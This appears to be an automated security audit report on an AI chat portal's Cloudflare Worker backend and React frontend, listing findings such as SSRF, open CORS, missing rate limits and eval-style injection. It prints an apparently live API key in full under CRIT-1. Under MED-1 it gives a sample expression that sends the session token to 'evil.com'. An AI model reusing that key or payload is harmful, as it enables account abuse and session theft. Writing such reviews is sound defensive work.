# Security Review - Sculptor AI Portal

**Date:** February 25, 2026
**Scope:** Full codebase review (backend Cloudflare Worker, React frontend, CI/CD, configuration)
**Severity Scale:** Critical > High > Medium > Low > Informational

---

## Executive Summary

The Sculptor AI Portal is a multi-provider AI chat application with a Cloudflare Workers backend (Hono framework, KV storage) and a React/Vite frontend. The application demonstrates several good security practices—PBKDF2 password hashing, constant-time comparison, hashed token storage, admin approval workflows, and session invalidation on account changes. However, there are **2 critical**, **4 high**, **5 medium**, and several lower-severity findings that should be addressed.

---

## Critical Findings

### CRIT-1: Hardcoded API Key in Frontend Source Code

**Files:** `frontend/src/services/aiService.js` (lines 64, 471), `frontend/src/services/deepResearchService.js` (line 37)

A real API key is hardcoded as a fallback in client-side JavaScript:

```javascript
apiKey = 'ak_2156e9306161e1c00b64688d4736bf00aecddd486f2a838c44a6e40144b52c19';
```

This key is embedded in **three separate locations** in frontend code and is shipped to every browser that loads the application. It appears in the built JavaScript bundle and is trivially extractable. Because this key authenticates against the backend as a real user, anyone can:

- Make unlimited AI chat/image/video requests at the owner's expense
- Access all authenticated endpoints (RSS feeds, model lists, etc.)
- Potentially impersonate the associated user account

**Recommendation:** Remove all hardcoded API keys immediately. Require authentication for all API requests. If unauthenticated demo access is desired, implement a dedicated rate-limited anonymous endpoint on the backend rather than embedding credentials in the client.

---

### CRIT-2: Open SSRF via Video Download Proxy

**File:** `backend/src/routes/video.js` (lines 103-129)

The `/api/video/download` endpoint accepts an arbitrary URL via query parameter and proxies the response back to the client:

```javascript
video.get('/download', async (c) => {
  const videoUrl = c.req.query('url');
  // ...
  const response = await fetch(videoUrl);  // Fetches ANY URL
  return c.newResponse(response.body, 200, { /* ... */ });
});
```

This is a **Server-Side Request Forgery (SSRF)** vulnerability. An attacker can use this endpoint to:

- Scan internal network services accessible from the Cloudflare Worker (though Workers have limited internal network access, this is still a risk)
- Exfiltrate data from internal services
- Use the server as a proxy to attack third-party services, attributing the traffic to your infrastructure
- Potentially access cloud metadata endpoints

**Recommendation:** Validate the URL against an allowlist of domains (e.g., only `*.googleapis.com` for Veo-generated videos). Reject private IP ranges, localhost, and non-HTTPS URLs. Consider signing the video URLs on the backend so the client can only download URLs the backend itself generated.

---

## High Severity Findings

### HIGH-1: No Rate Limiting on Authentication Endpoints

**Files:** `backend/src/routes/auth.js` (login, register), `backend/src/routes/admin.js` (admin login)

There is no rate limiting on the `/api/auth/login`, `/api/auth/register`, or `/api/admin/auth/login` endpoints. An attacker can:

- Brute-force user passwords at high speed
- Perform credential stuffing attacks
- Enumerate valid usernames (registration returns distinct errors for "username exists" vs "email exists")
- Create mass spam accounts (registration has no CAPTCHA)

The 12-character minimum password requirement helps but does not prevent targeted brute-force against individual accounts.

**Recommendation:**
- Implement progressive rate limiting (e.g., Cloudflare's built-in rate limiting, or a KV-based counter per IP)
- Add exponential backoff after failed login attempts (e.g., lock account for increasing durations after 5/10/20 failures)
- Return a generic error for both "username exists" and "email exists" during registration to prevent enumeration
- Consider adding CAPTCHA for registration

---

### HIGH-2: CORS Configured as Fully Open (`origin: '*'`)

**File:** `backend/src/middleware/cors.js`

```javascript
export const apiCors = cors({
  origin: '*',
  allowMethods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
  allowHeaders: ['Content-Type', 'Authorization', 'X-API-Key', 'x-api-key']
});
```

The wildcard CORS origin allows any website to make authenticated cross-origin requests to the API. While browsers won't send cookies (since authentication uses Bearer tokens), if a user has the application open and visits a malicious site, the malicious site could potentially craft requests if it can access the token (e.g., from a browser extension or another XSS vector).

More importantly, the wildcard CORS means:
- Any domain can probe the API
- Error messages and API structure are exposed to all origins
- It eliminates an important defense-in-depth layer

**Recommendation:** Restrict the `origin` to the actual frontend domain(s) (e.g., `https://sculptorai.org` and any staging domains). Use a dynamic origin check if multiple domains are needed.

---

### HIGH-3: Inconsistent Admin Authorization Check

**Files:** `backend/src/middleware/auth.js` (line 178), `backend/src/utils/auth.js` (line 27), `backend/src/routes/admin.js` (line 43)

Admin status is checked against both `user.role` and `user.status`:

```javascript
if (user.role !== 'admin' && user.status !== 'admin') {
  return c.json({ error: 'Admin access required' }, 403);
}
```

This dual-field check creates confusion and potential privilege escalation vectors:
- The `status` field is intended for account state (`pending`, `active`, `suspended`, `banned`, `admin`)
- The `role` field is intended for authorization (`user`, `admin`)
- Setting `status` to `admin` is listed as a valid status in the update endpoint, meaning any admin can create another admin by setting either field
- The `requireApproved` middleware does NOT check for `status === 'admin'` in its approved list—it only checks `active`. This means a user with `status: 'admin'` but `role: 'user'` would be blocked by `requireApproved` but pass `requireAdmin`

**Recommendation:** Use a single authoritative field for authorization (`role`). Remove `admin` from the valid `status` values. Audit all existing user records to ensure consistency.

---

### HIGH-4: RSS Article Content Proxy Without URL Validation

**File:** `backend/src/routes/rss.js` (lines 41-52), `backend/src/services/rss.js` (lines 144-172)

The `/api/rss/article-content` endpoint fetches arbitrary URLs and returns their content:

```javascript
rss.get('/article-content', async (c) => {
  const articleUrl = c.req.query('url');
  // ...
  const content = await fetchArticleContent(articleUrl);
});
```

Like the video download proxy, this is an SSRF vector. While it does require authentication, a compromised or malicious user could use it to:
- Scan internal services
- Fetch content from arbitrary URLs
- Bypass network restrictions

**Recommendation:** Validate the URL against the known RSS feed domains. Only allow fetching content from URLs that match domains in the `RSS_FEEDS` configuration, or at minimum restrict to `https://` URLs and block private IP ranges.

---

## Medium Severity Findings

### MED-1: `new Function()` Usage in GraphingModal (Client-side Code Injection)

**File:** `frontend/src/components/GraphingModal.jsx` (line 444)

```javascript
const f = new Function('x', `return ${cleanExpr}`);
```

User-supplied mathematical expressions are evaluated using the `Function` constructor, which is equivalent to `eval()`. While the expression goes through some string replacements (replacing `sin`, `cos`, etc. with `Math.*`), the sanitization is inadequate. An attacker could craft an expression that:

- Executes arbitrary JavaScript in the user's browser context
- Accesses `sessionStorage` to steal the authentication token
- Performs actions on behalf of the user

For example, an expression like `(function(){fetch('https://evil.com/?t='+sessionStorage.getItem('ai_portal_current_user'));return 0})()` would exfiltrate the user's session.

This is exploitable if an AI model returns a message suggesting the user graph a malicious expression, or through social engineering.

**Recommendation:** Use a safe mathematical expression parser (e.g., `math.js`, `expr-eval`) instead of `new Function()`. If `Function` must be used, implement strict allowlisting of characters (only digits, operators, parentheses, and known function names).

---

### MED-2: Session Token Passed in WebSocket URL Query Parameter

**File:** `frontend/src/services/geminiLiveService.js` (line 82), `backend/worker.js` (line 171)

```javascript
return `${wsUrl}/api/v1/live?token=${encodeURIComponent(token)}`;
```

The authentication token is passed as a URL query parameter for WebSocket connections. While this is a known limitation of the WebSocket API (which doesn't support custom headers during handshake), tokens in URLs:

- May be logged in server access logs, reverse proxy logs, and CDN logs
- May appear in browser history
- May be leaked via the `Referer` header if the page navigates

The code includes a comment acknowledging this risk, and the token does have a 24-hour expiry.

**Recommendation:** This is an accepted trade-off for WebSocket authentication, but ensure:
- Server-side logs redact query parameters containing `token`
- Consider implementing a one-time-use WebSocket ticket exchange (client requests a short-lived ticket via authenticated HTTP, then uses that ticket for the WebSocket handshake)

---

### MED-3: Client-Side Session Storage for Tokens

**File:** `frontend/src/services/authService.js` (line 128), `frontend/src/services/aiService.js` (multiple locations)

Authentication tokens are stored in `sessionStorage`:

```javascript
sessionStorage.setItem('ai_portal_current_user', JSON.stringify(user));
```

The stored object includes the full access token. While `sessionStorage` is better than `localStorage` (it's scoped to the tab and cleared on close), it is:
- Accessible to any JavaScript running in the same origin (including XSS payloads)
- Stored as plaintext JSON including the full token

Additionally, the `logoutUser` function only clears `sessionStorage` but does **not** call the backend logout endpoint to invalidate the server-side session:

```javascript
export const logoutUser = () => {
  return new Promise((resolve) => {
    sessionStorage.removeItem('ai_portal_current_user');
    resolve(true);
  });
};
```

**Recommendation:**
- The regular `logoutUser` function should call the backend `/api/auth/logout` endpoint (like `adminLogout` already does) to invalidate the server-side session
- Consider using `httpOnly` cookies for token storage to prevent JavaScript access entirely (requires backend changes for CSRF protection)

---

### MED-4: API Key Leakage in Gemini API URLs

**File:** `backend/src/services/gemini.js` (lines 406, 449, 570, 639, 739, 794)

API keys are passed as URL query parameters to the Gemini API:

```javascript
const url = `${GEMINI_BASE_URL}/models/${targetModel}:streamGenerateContent?alt=sse&key=${apiKey}`;
```

While this is how the Gemini API is designed to work, API keys in URLs:
- May be logged in proxy/CDN access logs
- May appear in error reporting services
- Could be leaked via Cloudflare's own logging

The `worker.js` does include a log line that redacts the key (`url.replace(apiKey, 'API_KEY_HIDDEN')`), but `gemini.js` logs the full request body without redacting the URL.

**Recommendation:** Where possible, use header-based authentication for API calls (check if the Gemini API supports this). Ensure all logging paths redact API keys. Consider wrapping the fetch calls in a utility that automatically redacts keys from any error messages.

---

### MED-5: Verbose Error Messages Expose Internal Details

**Files:** Multiple backend route files

Several endpoints return raw error messages from upstream APIs directly to the client:

```javascript
return c.json({ error: `OpenRouter API Error: ${errorText}` }, response.status);
return c.json({ error: `Gemini API Error: ${errorText}` }, response.status);
return c.json({ error: `Anthropic API Error: ${errorText}` }, response.status);
```

These error messages may contain:
- Internal API endpoint URLs
- Rate limit details
- Model availability information
- Token/billing information from provider responses

**Recommendation:** Log the full error server-side, but return a sanitized, generic error message to the client. Map known error codes to user-friendly messages.

---

## Low Severity Findings

### LOW-1: No Password Complexity Requirements Beyond Length

**File:** `backend/src/routes/auth.js` (line 82)

The password validation only enforces a minimum length of 12 characters:

```javascript
if (password.length < 12) {
  return c.json({ error: 'Password must be at least 12 characters long' }, 400);
}
```

There are no requirements for character variety (uppercase, lowercase, digits, special characters), and no check against common password lists.

**Recommendation:** Consider adding basic complexity requirements or, better yet, check passwords against the HaveIBeenPwned API (k-anonymity model) or a common password blocklist.

---

### LOW-2: No Maximum Password Length Enforcement

**File:** `backend/src/routes/auth.js`

There is no maximum length check on passwords. PBKDF2 will process arbitrarily long inputs, but extremely long passwords (e.g., 1MB+) could be used as a denial-of-service vector, consuming significant CPU time during hashing.

**Recommendation:** Enforce a reasonable maximum password length (e.g., 128 or 256 characters).

---

### LOW-3: Health/Status Endpoints Expose Provider Configuration

**File:** `backend/src/routes/health.js` (lines 47-49, 122-145)

The `/api/models/config` endpoint returns the raw models configuration, and `/api/status` reveals which API providers are configured:

```javascript
health.get('/models/config', (c) => {
  return c.json(getModelsConfig());
});
```

These endpoints are unauthenticated and reveal the internal architecture, provider relationships, and API identifiers.

**Recommendation:** Either require authentication for these endpoints or limit the information returned. The `/api/models` endpoint (used by the frontend) is sufficient for public consumption.

---

### LOW-4: Admin Logout Doesn't Require Admin Role Verification

**File:** `backend/src/routes/admin.js` (line 80)

The admin logout endpoint only requires `requireAuth`, not `requireAdmin`:

```javascript
admin.post('/auth/logout', requireAuth, async (c) => { ... });
```

While this isn't directly exploitable (any authenticated user can only invalidate their own session), it's inconsistent with the security model. A non-admin user could call this endpoint and it would function identically to the regular logout.

**Recommendation:** Add `requireAdmin` middleware for consistency, or consolidate into a single logout endpoint.

---

### LOW-5: Token in Query Parameter for Non-WebSocket Requests

**File:** `backend/src/middleware/auth.js` (lines 28-30)

The auth middleware accepts tokens from query parameters for all requests, not just WebSocket:

```javascript
const queryToken = c.req.query('token');
if (queryToken) return queryToken;
```

While the WebSocket upgrade handler in `worker.js` properly limits query parameter auth to WebSocket requests, the general auth middleware in Hono allows it universally.

**Recommendation:** Remove query parameter token support from the general auth middleware. Only allow it in the WebSocket-specific handler.

---

### LOW-6: Session Invalidation Scans All Sessions

**File:** `backend/src/utils/helpers.js` (lines 133-155)

The `invalidateUserSessions` function lists ALL sessions and checks each one:

```javascript
const list = await kv.list({ prefix: 'session:' });
for (const key of list.keys) {
  const sessionData = await kv.get(key.name, 'json');
  if (sessionData && sessionData.userId === userId) {
    deletePromises.push(kv.delete(key.name));
  }
}
```

This is an O(n) operation where n is the total number of active sessions across all users. At scale, this could be used as a DoS vector by an admin repeatedly suspending/unsuspending users.

**Recommendation:** Implement a `usersessions:{userId}` index as noted in the TODO comment, storing session hashes for each user for O(1) lookup.

---

## Informational Findings

### INFO-1: No CSRF Protection

The application uses Bearer token authentication rather than cookies, which inherently prevents CSRF attacks in most scenarios. However, if the architecture ever shifts to cookie-based auth, CSRF tokens would be needed.

### INFO-2: No Content Security Policy (CSP) Headers

The backend does not set CSP headers. While the frontend is served from Cloudflare Pages/Workers and benefits from their default security headers, explicit CSP headers would provide defense-in-depth against XSS, especially given the `srcDoc` iframe usage in `HtmlArtifactModal.jsx`.

**Note:** The `HtmlArtifactModal` does use `sandbox="allow-scripts"` on the iframe, which provides partial isolation, but it allows scripts to execute within the sandboxed frame. Consider adding `allow-same-origin` restrictions and ensuring the sandboxed content cannot access the parent frame.

### INFO-3: No Request Body Size Limits

The backend does not enforce request body size limits. While Cloudflare Workers have a built-in limit (typically 100MB for paid plans), explicit limits on endpoints that accept user content (chat messages, image data, file uploads) would prevent resource abuse.

### INFO-4: Console Logging of Sensitive Data

Multiple files log potentially sensitive information:
- `authService.js` logs API URLs and endpoints
- `aiService.js` logs user session details
- `gemini.js` logs full request bodies (which may contain user messages and images)
- `admin.js` logs role changes (this is good for audit purposes)

**Recommendation:** Implement structured logging with sensitivity levels. Ensure production logs don't contain user content or authentication tokens.

### INFO-5: Shared Chat View Reads from localStorage Without Validation

**File:** `frontend/src/components/SharedChatView.jsx` (line 59)

```javascript
const storedChats = JSON.parse(localStorage.getItem('chats') || '[]');
```

The chat ID comes from a URL query parameter and is used to look up data in localStorage. While this is client-side only and the data is already on the user's machine, malformed localStorage data could cause parsing errors. The chat "sharing" is also local-only—it only works if the viewer has the same localStorage, which makes it not a true sharing feature.

### INFO-6: `axios` Imported But Mostly Unused

**Files:** `frontend/src/services/aiService.js`, `frontend/src/services/deepResearchService.js`

The `axios` library is imported but `fetch` is used for all actual requests. This increases the bundle size unnecessarily and could confuse developers about which HTTP client to use.

---

## Positive Security Practices Observed

The following security practices are well-implemented and worth acknowledging:

1. **Password hashing:** PBKDF2 with 100,000 iterations, 16-byte salt, SHA-256 — industry standard
2. **Constant-time comparison:** Used for password verification to prevent timing attacks
3. **Token hashing:** Session tokens and API keys are hashed (SHA-256) before storage; plaintext tokens are never persisted
4. **Admin approval workflow:** New users are `pending` by default and require admin activation
5. **Session invalidation:** Sessions are invalidated when passwords are changed or accounts are suspended
6. **Self-modification prevention:** Admins cannot modify or delete their own accounts
7. **Case-insensitive username/email lookups:** Prevents duplicate accounts via case variations
8. **API key removed from live config endpoint:** A previous vulnerability exposing the Gemini API key was fixed (noted in `worker.js` line 231-234)
9. **Input validation:** Username format, email format, and password length are validated on registration
10. **Rollback logic:** User creation and API key generation include best-effort rollback on partial failure
11. **Token prefix differentiation:** API keys (`ak_`) and session tokens (`sess_`) are differentiated by prefix for correct handling
12. **WebSocket authentication:** The Gemini Live WebSocket endpoint requires authentication
13. **Sensitive field stripping:** `sanitizeUser()` removes `passwordHash` and `passwordSalt` before returning user data to clients

---

## Recommended Priority Actions

| Priority | Finding | Effort |
|----------|---------|--------|
| **Immediate** | CRIT-1: Remove hardcoded API key from frontend | Low |
| **Immediate** | CRIT-2: Add URL allowlist to video download proxy | Low |
| **This Week** | HIGH-1: Add rate limiting to auth endpoints | Medium |
| **This Week** | HIGH-2: Restrict CORS origins | Low |
| **This Week** | HIGH-4: Add URL validation to RSS proxy | Low |
| **This Sprint** | HIGH-3: Consolidate admin role/status fields | Medium |
| **This Sprint** | MED-1: Replace `new Function()` with safe math parser | Low |
| **This Sprint** | MED-3: Fix regular logout to invalidate server session | Low |
| **This Sprint** | MED-5: Sanitize error messages returned to clients | Medium |
| **Backlog** | MED-2: Consider WebSocket ticket exchange | High |
| **Backlog** | MED-4: Redact API keys from all log paths | Medium |
| **Backlog** | LOW-1 through LOW-6 | Low-Medium |

---

*Review performed by automated security analysis. Findings should be validated by the development team and assessed against the application's specific threat model and risk tolerance.*
